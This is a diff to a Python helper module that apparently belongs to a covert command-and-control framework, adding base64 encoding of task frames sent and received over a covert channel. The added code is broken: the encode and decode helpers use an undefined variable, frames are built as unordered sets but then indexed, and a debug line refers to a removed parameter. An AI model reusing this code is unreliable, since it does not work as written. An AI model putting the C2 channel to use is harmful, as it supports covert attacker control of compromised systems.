@@ -1,6 +1,9 @@
 import socket
 import struct
 import config
+import base64
+
+
 def importModule(modName, modType):
 	"""
 	Imports a passed module as either an 'encoder' or a 'transport'; called with either encoder.X() or transport.X()
@@ -37,6 +40,12 @@ def recvFrameFromC2(sock):
 def killSocket(sock):
 	sock.close()
 
+def task_encode(task):
+	return base64.b64encode(data)
+
+def task_decode(task):
+	return base64.b64decode(data)
+
 def prepData(data):
 	# This will prepare whatever data is given based on the config
 	rdyData = encoder.encode(data)
@@ -52,24 +61,21 @@ def retrieveData():
 	# Returns unencoded data
 
 	data = transport.retrieveData()
-
 	if config.debug:
 		print (color("RAW RETRIEVED DATA: ", status=False, yellow=True) + "%s") % (data)
-
 	# Prepare the recieved data by running it through the decoder
 	preped_data = decodeData(data)
+	data_frame = {preped_data[0], task_decode(preped_data[1])}
+	return data_frame
 
-	return preped_data
-
-def sendData(data):
+def sendData(task_frame):
 	# This will upload the data via the covert channel
 	# returns a confirmation that the data has been sent
-
 	if config.debug:
 		print (color("RAW DATA TO BE SENT: ", status=False, yellow=True) + "%s") % (data)
 	# Prepares the data to be sent via the covert channel
-	preped_data = prepData(data)
-
+	new_task_frame = {task_frame[0], task_encode(task_frame[1])}
+	preped_data = prepData(new_task_frame)
 	transport.sendData(preped_data)
 
 def color(string, status=True, warning=False, bold=True, yellow=False):
